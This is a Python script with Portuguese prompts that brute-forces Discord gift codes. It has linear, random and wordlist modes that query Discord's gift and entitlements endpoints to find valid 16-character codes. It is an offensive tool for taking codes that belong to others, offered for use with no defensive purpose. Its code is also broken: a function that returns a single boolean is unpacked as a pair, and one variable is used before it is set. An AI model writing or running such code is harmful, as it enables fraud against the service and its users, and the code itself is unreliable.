import requests
import itertools
import string
import random

base_url = "https://discord.com/gifts/"
valid_chars = string.digits + string.ascii_lowercase + string.ascii_uppercase

def check_code(code):
    url = base_url + code
    response = requests.get(url)
    
    if response.status_code == 200:
        endpoint_url = f"https://discord.com/api/v9/entitlements/gift-codes/{code}?country_code=BR&with_application=true&with_subscription_plan=true"
        endpoint_response = requests.get(endpoint_url)

        if endpoint_response.status_code == 200:
            return True
        else:
            print(f"Endpoint inválido para a URL: {url}")
            return False
    else:
        return False

def brute_force_code(code_length):
    first_10_statuses = []
    status_standard = None

    for code in itertools.product(valid_chars, repeat=code_length):
        code_str = "".join(code)
        if check_code(code_str):
            status, is_working = check_code(code_str)

            if status_standard is not None and status != status_standard:
                print(f"Encontrado código com status diferente ({status}): {url}")
                break

            if len(first_10_statuses) < 10:
                first_10_statuses.append(status)
            elif len(first_10_statuses) == 10:
                if all(status == first_10_statuses[0] for status in first_10_statuses) and status != 0:
                    status_standard = first_10_statuses[0]

                first_10_statuses.pop(0)

            url = base_url + code_str
            if is_working:
                print(f"URL: {url}, Funciona: Sim, Status: {status}")
            else:
                print(f"URL: {url}, Funciona: Não")

def brute_force_random(code_length):
    while True:
        code_str = ''.join(random.choices(valid_chars, k=code_length))
        is_working = check_code(code_str)

        url = base_url + code_str
        if is_working:
            status, _ = check_code(code_str)
            print(f"URL: {url}, Funciona: Sim, Status: {status}")
        else:
            print(f"URL: {url}, Funciona: Não")

def brute_force_wordlist(wordlist_path):
    with open(wordlist_path, "r") as file:
        for code in file:
            code = code.strip()
            status, is_working = check_code(code)

            url = base_url + code
            if is_working:
                print(f"URL: {url}, Funciona: Sim, Status: {status}")
            else:
                print(f"URL: {url}, Funciona: Não")

def main():
    print("Escolha o tipo de brute force:")
    print("1 - Brute Force Linear")
    print("2 - Brute Force Aleatório")
    print("3 - Brute Force com Wordlist")

    option = int(input("Digite o número da opção desejada: "))

    code_length = 16

    if option == 1:
        brute_force_code(code_length)
    elif option == 2:
        brute_force_random(code_length)
    elif option == 3:
        wordlist_path = input("Digite o caminho da wordlist: ")
        brute_force_wordlist(wordlist_path)
    else:
        print("Opção inválida. Por favor, escolha uma das opções válidas (1, 2 ou 3).")

if __name__ == "__main__":
    main()
